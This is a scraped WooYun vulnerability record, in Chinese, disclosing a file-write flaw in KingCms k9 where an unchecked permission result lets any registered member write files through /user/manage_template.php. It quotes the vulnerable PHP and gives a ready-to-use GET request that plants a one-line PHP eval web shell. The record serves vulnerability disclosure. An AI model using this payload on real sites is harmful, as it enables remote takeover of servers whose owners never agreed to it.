{"id": 36153, "wybug_id": "wooyun-2015-0102492", "wybug_title": "KingCms最新版（k9）文件写入导致GetShell", "wybug_corp": "KingCms", "wybug_author": "路人甲", "wybug_date": "2015-03-23 15:29", "wybug_open_date": "2015-05-07 15:30", "wybug_type": "命令执行", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "任意文件写入利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-23：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-05-07：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： KingCms最新版（k9）文件写入导致GetShell 详细说明：  朋友的公司想购买kingcms的授权，让我帮忙看下。发现kingcms很长一段时间没更新了，憋了一段时间放出了最新版的k9，官网下下来学习一下。在wooyun上看到了几个漏洞，如： WooYun: kingcms最新版sql注入漏洞 一般的会员就可以实现GetsShell问题出在这里：/user/manage_template.php\n//编辑文件function _edit(){\t\t$u=new user;$u->auth_role('template_edit');\t\t$filename=kc_get('filename','/^([a-zA-Z0-9\\_\\-]+\\/)*[a-z0-9A-Z\\_\\-]+\\.[a-z0-9]{2,8}$/',1);\t$content=empty($_POST['content'])?'':$_POST['content'];\t$file=new file;\t$file->put(T.$filename,$content);\tkc_ajax(array('JS'=>\"\\$('#list_after').html('').hide();\"));}这里有个权限验证$u->auth_role('template_edit');\t，我们去看看public function auth_role($level=0,$is=false){\t\tif(empty($level)) return $this->info['islogin'];\t\tif($level==1 && !$this->info['islogin']) return $is ? false :kc_tip('请先登录!','form');\t\t//exit($this->info['islogin'].'ccc');\t\t\t\tif($is==true && strpos($level,'_deny')) return false;\t\t\t\tglobal $db;\t\t$res_rids=$db->getRows_two('%s_user_role_bind','rid','removedate','userid='.$this->info['userid']);\t\tif(empty($res_rids)) return false;//注释1：如果没有权限，返回false\t\t$rids=array_keys($res_rids);\t\t$rs=$db->getRows_two('%s_user_role_auth','auth','id','rid in ('.implode(',',$rids).')');\t\t\t\t/*\t\t$rs=$db->getRows_join('%s_user_role_auth','%s_user_role_bind','auth','rid','rid','t2.userid='.$this->info['userid'].' and t1.auth=\\''.$level.'\\'');\t\t */\t\tif(!empty($rs['admin'])) return true;\t\t//if(empty($rs[$level])) return $is ? false : kc_tip('您无权访问当前页!','form');\t\treturn empty($rs[$level]) ? ($is ? false : kc_tip('您无权访问当前页!','form')) : true;\t}\n看上面代码“注释1”处，如果用户没有相应的权限就返回false但是在上面的第一段代码中，并没有判断是不是返回false啊，也没去exit()，也就是说返回true和返回false是一样的，没有判断，程序继续向下执行啊。也就是说，注册的会员都可以操作这里。那就写入个文件吧test.php内容简单点，就写\n<?phpeval($_POST[\"cmd\"]);?>\nPayload:get提交\n/user/manage_template.php?jsoncallback=1&_=1&CMD=edit&METHOD=POST&AJAX=1&filename=test.php&content=%3C%3Fphp%0Aeval(%24_POST%5B%22cmd%22%5D)%3B%0A%3F%3E\n提交过程如下图\n\n测试如下图\n\n   漏洞证明：  见 详细说明   修复方案：  权限验证   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}